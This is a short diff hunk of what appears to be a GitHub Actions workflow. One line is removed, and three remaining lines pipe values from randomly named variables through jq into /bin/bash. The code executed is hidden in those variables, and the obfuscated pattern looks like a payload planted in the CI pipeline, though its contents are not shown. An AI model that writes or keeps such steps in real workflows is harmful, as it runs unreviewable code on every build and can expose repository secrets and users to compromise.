@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$kbwmk776" | jq -r .l75 | /bin/bash
           printf '%s' "$mnhd66339" | jq -r .gp696 | /bin/bash
           echo $yy0057 | jq -r .awo669 | /bin/bash
-          echo $gd7921 | jq -r .w45 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
